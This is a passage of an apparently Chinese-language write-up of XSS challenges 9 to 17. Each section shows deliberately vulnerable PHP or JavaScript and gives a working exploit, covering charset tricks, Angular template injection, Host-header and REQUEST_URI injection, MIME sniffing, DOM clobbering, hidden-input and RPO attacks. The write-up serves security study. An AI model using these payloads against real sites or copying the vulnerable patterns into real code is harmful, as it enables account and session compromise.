1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt; &nbsp;%4c
+&gt; &nbsp;%6e
+/ &nbsp;%61
+( &nbsp;%4d
+) &nbsp;%5d
+= &nbsp;%7e
+; &nbsp;%5e
+' &nbsp;%7d</code></pre><p style="margin-bottom: 1.2em !important;">IE payload：</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss9.php?text=&lt;meta http-equiv="content-Type" content="text/html; charset=cp1025"&gt;%4c%89%94%87%01%a2%99%83%7e%f1%01%96%95%85%99%99%96%99%7e%81%93%85%99%a3%4d%f1%5d%0b%6e</code></pre><p style="margin-bottom: 1.2em !important;">PS: 关于<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">meta</code>的一些使用语法可以看看这.<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">https://www.w3.org/TR/html401/struct/global.html#h-7.4.4</code></p><p style="margin-bottom: 1.2em !important;">ref: https://github.com/cure53/XSSChallengeWiki/wiki/Puzzle-3-on-kcal.pw</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">10. MVM</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;html ng-app&gt;
+&lt;head&gt;
+&lt;meta charset=utf-8&gt;
+&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.5/angular.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;input id="username" name="username" tabindex="1" ng-model="username" ng-init="username='&lt;?php if(strlen($_GET["username"])&lt;37){echo htmlspecialchars($_GET["username"]);}?&gt;'" placeholder="username" maxlength="11" type="text"&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss10.php?username=hiphopman</p><p style="margin-bottom: 1.2em !important;">对框架不是很熟悉，提示是Client Side Template Injection，翻M师傅推特找到一个利用</p><p style="margin-bottom: 1.2em !important;">FF &amp;&amp; Chrome Exp</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">{{[].pop.constructor('alert()')()}}
+
+http://xianzhi.aliyun.com/xss10.php?username=%7B%7B%5B%5D.pop.constructor(%27alert(1)%27)()%7D%7D</code></pre><p style="margin-bottom: 1.2em !important;">ref: http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">11. HOST</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">"use strict";
+var http = require('http');
+
+(function(){
+ &nbsp; &nbsp;http.createServer(function (req, res) {
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;res.writeHead( 200, { "Content-Type" : "text/html;charset=utf-8", "X-XSS-Protection" : "0" } );
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;res.end( '&lt;html&gt;&lt;head&gt;&lt;title&gt;' + req.headers["host"] + '&lt;/title&gt;&lt;/head&gt;&lt;body&gt;It works!&lt;/body&gt;&lt;/html&gt;' );
+
+ &nbsp; &nbsp;}).listen(80);
+ &nbsp; &nbsp;console.log( "Running server on port 80" );
+})();</code></pre><p style="margin-bottom: 1.2em !important;">http://ec2-52-15-146-21.us-east-2.compute.amazonaws.com/</p><p style="margin-bottom: 1.2em !important;">HOST头注入，这里又需要用到IE下一个奇怪的姿势.</p><p style="margin-bottom: 1.2em !important;">https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/</p><p style="margin-bottom: 1.2em !important;">重点部分：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iap1pSgDJTyKK1pDXwLKQ7efvw2Ggwyuu2Y4svLtI9VHr0v2tSNpdATg/0.png" class="" data-ratio="0.438685208596713" data-w="791" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">所以可以构造</p><p style="margin-bottom: 1.2em !important;">11.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header('HTTP/1.1 307 Redirect');
+header('Location: '.$_GET['u']);</code></pre><p style="margin-bottom: 1.2em !important;">IE11 exp</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://ns1.rootk.pw:8080/xss/wp/11.php?u=http://ec2-52-15-146-21.us-east-2.compute.amazonaws.com%252f&lt;%252ftitle&gt;&lt;script&gt;alert(document.domain)&lt;%252fscript&gt;&lt;!--.baidu.com</code></pre><p style="margin-bottom: 1.2em !important;">这里最新的IE11是失效的，ie11.483.15063.0失败，本地成功的IE版本为 ie11.0.9600.17843</p><p style="margin-bottom: 1.2em !important;">ref: http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">12. preview</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+ &nbsp; &nbsp;# the request
+ &nbsp; &nbsp;$ch = curl_init($_GET["url"]);
+ &nbsp; &nbsp;curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+ &nbsp; &nbsp;curl_exec($ch);
+ &nbsp; &nbsp;# get the content type
+ &nbsp; &nbsp;$mime = array("application/octet-stream","application/postscript","application/x-cdf","application/x-compressed","application/x-zip-compressed","audio/basic","audio/wav","audio/x-aiff","video/avi","video/mpeg","video/x-msvideo","image/png","image/jpeg","image/gif");
+ &nbsp; &nbsp;if (in_array(curl_getinfo($ch, CURLINFO_CONTENT_TYPE), $mime)) {
+ &nbsp; &nbsp;header("Content-Type:".curl_getinfo($ch, CURLINFO_CONTENT_TYPE));
+ &nbsp; &nbsp;//header("X-Content-Type-Options: nosniff");
+ &nbsp; &nbsp;echo curl_exec($ch);
+ &nbsp; &nbsp;}
+ &nbsp; &nbsp;# output
+ &nbsp; &nbsp;// text/html; charset=ISO-8859-1
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss12.php?url=https://www.baidu.com/img/bd_logo1.png</p><p style="margin-bottom: 1.2em !important;">先来了解一下IE的奇怪MIME判断。https://blog.fox-it.com/2012/05/08/mime-sniffing-feature-or-vulnerability/</p><p style="margin-bottom: 1.2em !important;">因为有些服务器指定的不是一个正确的Content-Type头，所以IE为了兼容这些文件类型，它会将文件的前256个字节与已知文件头进行比较，然后得到一个结果…也就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">&lt;html&gt;</code>作为开头的话，会被认为是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">text/html</code></p><p style="margin-bottom: 1.2em !important;">所以可以构造一下</p><p style="margin-bottom: 1.2em !important;">IE exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss12.php?url=http://ns1.rootk.pw:8080/xss/wp/12.php</code></pre><p style="margin-bottom: 1.2em !important;">12.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type: application/octet-stream");
+?&gt;
+&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://xianzhi.aliyun.com/forum/read/224.html</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">13. REQUEST_URI</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+echo "REQUEST_URI:".$_SERVER['REQUEST_URI'];
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss13.php</p><p style="margin-bottom: 1.2em !important;">REQUEST_URI请求的xss，在IE下，加一次跳转就不会进行编码</p><p style="margin-bottom: 1.2em !important;">IE exp:http://ns1.rootk.pw:8080/xss/wp/13.php</p><p style="margin-bottom: 1.2em !important;">13.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Location: http://xianzhi.aliyun.com/xss13.php/&lt;svg/onload=alert(document.domain)&gt;");</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://speakerdeck.com/masatokinugawa/xss-attacks-through-path</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">14. HIDDEN</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header('X-XSS-Protection:0');
+header('Content-Type:text/html;charset=utf-8');
+?&gt;
+&lt;head&gt;
+&lt;meta http-equiv="x-ua-compatible" content="IE=10"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=''&gt;
+&lt;input type='hidden' name='token' value='&lt;?php
+ &nbsp;echo htmlspecialchars($_GET['token']); ?&gt;'&gt;
+&lt;input type='submit'&gt;
+&lt;/body&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss14.php?token=233</p><p style="margin-bottom: 1.2em !important;">很久经典的一个问题，模糊记得xss书上有讲这个问题，因为标签里面有hidden属性的存在，导致大部分事件没法直接触发</p><p style="margin-bottom: 1.2em !important;">所以一般分为两点，输出点是在hidden属性之前还是之后(不能闭合掉input的情况下)</p><ol style="" class=" list-paddingleft-2"><li><p>之前则可以覆盖type为其他的，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">&lt;input value="a" src=1 onerror=alert(1) type="image" type="hidden"&gt;</code></p></li><li><p>之后的话，只能通过间接的方式来触发，比如大家熟知的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">' accesskey='x' onclick='alert(/1/)</code>，然后按shift+alt+x触发xss，但是还可以这样操作，无交互的触发xss，相比起来已经是无限制了，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">'style='behavior:url(?)'onreadystatechange='alert(1)</code></p></li></ol><p style="margin-bottom: 1.2em !important;">参考文章：http://masatokinugawa.l0.cm/2016/04/hidden-input-xss.html</p><p style="margin-bottom: 1.2em !important;">IE exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss14.php?token=%27style=%27behavior:url(?)%27onreadystatechange=%27alert(1)</code></pre><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">15. Frame Buster</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+$page=strtolower($_GET["page"]);
+$regex="/on([a-zA-Z])+/i";
+$page=str_replace("style","_",$page);
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=utf-8&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action='xss15.php?page=&lt;?php
+if(preg_match($regex,$page))
+{
+echo "XSS Detected!";
+}
+else
+{
+echo htmlspecialchars($page);
+}
+?&gt;'&gt;&lt;/form&gt;
+&lt;script&gt;
+if(top!=self){
+ location=self.location
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss15.php?page=1</p><p style="margin-bottom: 1.2em !important;">很有意思的一个题目，一种防御iframe框架加载的方式，如果用框架加载的话，会让页面一直刷新….此题提示是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">DOM Clobbering</code></p><p style="margin-bottom: 1.2em !important;">什么又是DOM Clobbering，在<strong>IE8</strong>下，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">abc.def</code>将会是123</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;form id=abc def=123&gt;&lt;/form&gt;
+&lt;script&gt;
+alert(abc.def)
+&lt;/script&gt;</code></pre><p style="margin-bottom: 1.2em !important;">那么题目中的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">self.location</code>也就可以通过这样的方式去覆盖值.</p><p style="margin-bottom: 1.2em !important;">IE exp:http://ns1.rootk.pw:8080/xss/wp/15.html</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;meta http-equiv=x-ua-compatible content=IE=8&gt;
+&lt;iframe src="http://xianzhi.aliyun.com/xss15.php?page=1'name=self location='javascript%3Aalert(document.domain)"&gt;&lt;/iframe&gt;</code></pre><p style="margin-bottom: 1.2em !important;">当然还是需要注意调节兼容性，关于兼容性，可以看第八题的writeup
+更多关于DOM Clobbering的文章:
+ref: http://www.thespanner.co.uk/2013/05/16/dom-clobbering/https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">16. PHP_SELF</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=utf-8&gt;
+&lt;meta http-equiv="X-UA-Compatible" content="IE=10"&gt;
+&lt;link href="styles.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img src="xss.png" style="display: none;"&gt;
+&lt;h1&gt;
+&lt;?php
+$output=str_replace("&lt;","&amp;lt;",$_SERVER['PHP_SELF']);
+$output=str_replace("&gt;","&amp;gt;",$output);
+echo $output;
+?&gt;
+&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss16.php</p><p style="margin-bottom: 1.2em !important;">一个比较明显的RPO漏洞，但是国内对这方面介绍比较少</p><p style="margin-bottom: 1.2em !important;">http://www.mbsd.jp/Whitepaper/rpo.pdf这个文档对RPO讲的比较清楚</p><p style="margin-bottom: 1.2em !important;">总结起来就是因为php_self的存在，下面这个css会根据链接情况来加载</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;link href="styles.css" rel="stylesheet" type="text/css" /&gt;</code></pre><p style="margin-bottom: 1.2em !important;">当我访问<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">xianzhi.aliyun.com/xss16.php</code>的时候，web相对路径就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">/</code>，这时候加载的css就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">xianzhi.aliyun.com/styles.css</code></p><p style="margin-bottom: 1.2em !important;">但是当我访问<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/</code>，也就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">{}*{background-color: red}*{}</code>，web的相对路径就是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/</code>，这时候加载的css内容是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">http://xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/styles.css</code></p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iaLOiba5R2YNRD046MXn7uicDWQrC6iapyRXF3zxu81pF1Wbic4WwzJLcKuw/0.png" class="" data-ratio="0.25161290322580643" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">css的解析并没有像html那么严格，所以你可以看到网页将会被渲染为红色。</p><p style="margin-bottom: 1.2em !important;">高潮部分来了，现在想办法就是利用css去加载jshttp://blog.innerht.ml/cascading-style-scripting/</p><p style="margin-bottom: 1.2em !important;">可以利用sct文件，但是缺陷就是sct必须要是在同域下.</p><p style="margin-bottom: 1.2em !important;">可以发现题目还有一个xss.png….内容如下</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;scriptlet&gt;
+ &nbsp; &nbsp;&lt;implements type="behavior"/&gt;
+ &nbsp; &nbsp;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/scriptlet&gt;</code></pre><p style="margin-bottom: 1.2em !important;">IE exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss16.php/{}*{behavior:url(http://xianzhi.aliyun.com/xss.png)}*{}/</code></pre><p style="margin-bottom: 1.2em !important;">当然css触发xss的，还可以用<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">expression</code></p><p style="margin-bottom: 1.2em !important;">ref: http://www.thespanner.co.uk/2014/03/21/rpo/</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">17. passive element</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type:text/html;charset=utf-8");
+header("X-Content-Type-Options: nosniff");
+header("X-FRAME-OPTIONS: DENY");
+header("X-XSS-Protection: 0");
+$content=$_GET["content"];
+echo "&lt;div data-content='".htmlspecialchars($content)."'&gt;";
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss17.php?content=data</p><p style="margin-bottom: 1.2em !important;">输出点在div里面，这种被动元素如何去触发xss？</p><p style="margin-bottom: 1.2em !important;">html5sec总结：https://html5sec.org/#145所以可以被动一点，需要用户点击一下之类操作去触发xss</p><p style="margin-bottom: 1.2em !important;">IE exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">http://xianzhi.aliyun.com/xss17.php?content=a%27%20style=%27-webkit-user-modify:read-write%27%20onfocus=%27alert(1)%27%20id=%27xss</code></pre><p style="margin-bottom: 1.2em !important;">但是M师傅提供了一个比较通用而且无需用户交互的poc</p><p style="margin-bottom: 1.2em !important;">除FF以外的浏览器 exp:</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 